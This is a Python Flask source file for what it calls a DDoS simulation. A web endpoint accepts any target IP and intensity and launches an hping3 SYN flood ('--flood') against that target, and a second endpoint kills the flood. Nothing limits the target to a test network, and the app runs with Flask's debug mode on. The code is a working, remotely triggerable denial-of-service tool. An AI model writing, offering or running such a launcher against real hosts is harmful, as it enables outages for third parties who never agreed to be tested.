# Importing essential libraries
from flask import Flask, request, jsonify, render_template
import subprocess
import logging
from logging.handlers import RotatingFileHandler
import os

app = Flask(__name__)

# Ensure the log directory exists
log_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(log_dir, 'ddos_simulation.log')

if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Setup logging
log_handler = RotatingFileHandler(log_file, maxBytes=10000, backupCount=1)
log_handler.setLevel(logging.INFO)
log_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
log_handler.setFormatter(log_formatter)

app.logger.addHandler(log_handler)
app.logger.setLevel(logging.INFO)

# Logs a message to confirm logging is set up
app.logger.info('Logging is configured correctly.')

# Accessing "index.html" file
@app.route('/')
def index():
    app.logger.info('Index page accessed')
    return render_template('index.html')

# Logs the start of an attack, runs the attack command then returns a JSON response.
@app.route('/start-attack', methods=['POST'])
def start_attack():
    traffic = request.json.get('traffic', 0)
    target_ip = request.json.get('target_ip', '127.0.0.1')
    app.logger.info(f'Starting attack on {target_ip} with intensity {traffic}')
    subprocess.Popen(['hping3', '-i', f'u{traffic}', '-S', '--flood', target_ip])
    return jsonify({"status": "Attack started"}), 200

# Runs the Flask app in debug mode if the script is executed directly.
@app.route('/stop-attack', methods=['POST'])
def stop_attack():
    app.logger.info('Stopping attack')
    subprocess.Popen(['pkill', 'hping3'])
    return jsonify({"status": "Attack stopped"}), 200

if __name__ == '__main__':
    app.run(debug=True)
